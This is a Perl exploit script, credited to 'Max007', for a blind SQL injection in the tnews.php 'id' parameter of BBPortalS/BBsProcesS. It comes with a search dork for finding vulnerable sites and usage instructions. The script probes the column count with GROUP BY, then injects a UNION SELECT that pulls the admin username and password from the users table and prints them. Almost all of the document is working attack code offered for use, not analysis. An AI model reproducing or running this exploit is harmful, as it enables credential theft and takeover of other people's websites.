#BBPortalS BBsProcesS Remote Blind SQL Injection Exploit 
#Bug Found And Write By Max007
#Exploit Tested On V.1.5.10 And V.1.6.2 And 1.5.11
#info:For The Version BBPortalS 2.0 name of field is user and password but you have to find name of table
#!/usr/bin/perl
use LWP::UserAgent;
$err=1;
$www = new LWP::UserAgent;
sub utilisation()
{
print "\n\tVulnerability Found By Max007 ;)";
print "\n\tBlind SQL Injection In Script BBPortalS / BBsProcesS\n\tDork:\"inurl : tnews.php?op\"";
print "\n\tSyntax Exmple: ";
print "Exploit.pl http://www.site-vuln.com\n";
exit(0);
}

sub err()
{
print "\n this script is not vulnerable !\n";
exit();
}

sub table()
{
print "\n\n \tThis Site Is Vulerable\n \tNumber of Fields : $err\n\tBut You have To Find Name Of Table !\n\tI Don't Have Time To Do This For you hhh ;)\n";
exit();
}

if(!$ARGV[0]){utilisation();}
$host=$ARGV[0];


sub max007()
{
$champ="1," x $err;
chop($champ);
$inject="tnews.php?op=tnews&id=-9/**/group/**/by/**/$err/*";
$sql = "$host/".$inject;
print "\n                 research number of fields .... \n";
$res = $www -> get($sql);
if(!($res -> content =~ /Warning/)){
print "               The Current number of fields is : $err\n";
$err++;
max007();
}
else{
if($err==1){ err();}
}
}
if($err==1){ max007();}
$err-=1;
#system("cls");
print "\nThe number of fields is: $err";

$nbr_champ=$err;
$champ="concat(char(117,115,101,114,110,97,109,101,58),login,char(32,32,61,61,61,61,61,32,32,32,112,97,115,115,119,111,114,100,58),pass,char(42,42,42,42,42,42,42,42,42,42,61,61,61,61,61,61,61,61,61,61))," x $nbr_champ;
chop($champ);

$inject="tnews.php?op=tnews&id=-9/**/union/**/select/**/".$champ."/**/from/**/users/**/where/**/pid=1/*";
$sql = "$host/".$inject;
$res = $www -> get($sql) or err();
$i=0;$j=0;
$i=index($res->content,'username:');
$j=index($res->content,'**********==========');
$ch=substr($res->content,$i,$j-$i);

if($res->content =~ /username/)
{
print "\n\n              Attack successful\n\n";
print "Admin User Name And Password Has Been Found ;)\n\n\t";
print "$ch \n\n";
}

else {table();}

#Je Suis Triste Vraiment Triste Et Je ne Sais Pas Pourquoi,PourTant je ne dois pas l'�tre,